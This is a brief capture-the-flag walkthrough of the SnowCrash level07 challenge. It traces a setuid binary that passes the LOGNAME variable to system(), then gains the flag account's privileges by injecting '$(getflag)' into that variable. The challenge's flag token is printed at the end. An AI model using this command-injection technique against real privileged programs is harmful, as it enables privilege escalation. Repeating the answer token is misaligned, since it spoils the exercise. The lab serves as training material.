In our home directory, we just see an executable
```
level07@SnowCrash:~$ ls -la level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Let's just start by analyzing level07 with `ltrace` :
```
__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
getegid() = 2007
geteuid() = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME") = "level07
asprintf(0xbffff6f4, 0x8048688, 0xbfffff31, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```

We observe that the executable calls getenv to retrieve the LOGNAME environment variable and uses echo to print its value. To exploit this, we can change the value of LOGNAME by exporting it with the following command:
`export LOGNAME='$(getflag)' `

Then, simply run the executable ./level07 to display the flag:
```
flag07@SnowCrash:~$ ./level07
Check flag.Here is your token :fiumuikeil55xe9cu4dood66h
```
